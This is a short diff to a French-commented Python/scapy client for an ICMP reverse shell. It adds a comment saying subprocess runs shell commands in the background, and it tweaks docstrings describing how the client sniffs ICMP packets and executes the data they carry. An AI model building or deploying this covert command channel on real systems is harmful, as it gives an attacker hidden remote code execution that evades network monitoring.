@@ -1,5 +1,6 @@
 from scapy.all import *
 from scapy.layers.inet import IP, ICMP
+# On importe la librairie subprocess afin d'executer des commandes shell en arrière plan
 import subprocess
 __author__ = "Chauvin Antoine"
 __copyright__ = ""
@@ -13,7 +14,6 @@ __status__ = "Production"
 """
 ICMP PACKET
 https://cryptsus.com/blog/icmp-reverse-shell.html
-
 0                   1                     2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
@@ -41,10 +41,8 @@ class Client:
     def main(self):
         """
         Méthode de classe qui aura pour but d'initialiser l'audit du traffic
-        On utilisera un sniffer asynchrone (https://scapy.readthedocs.io/en/latest/usage.html)
-        afin d'avoir une I/O non-bloquante.
+        On utilisera un sniffer synchrone (https://scapy.readthedocs.io/en/latest/usage.html)
         """
-
         sniff(prn=self.process, store=False, filter="icmp")
 
     def process(self, packet):
@@ -52,7 +50,6 @@ class Client:
         On va filtrer plus en profondeur le paquet afin de vérifier que notre paquet est celui
         qu'on veut (via l'identifier ICMP).
         Par la suite on se chargera d'executer les données dans l'optional Data
-
         On oublie pas de filtrer le type de paquet ICMP
         -echo-reply (type 0)
         -echo-request (code 8)
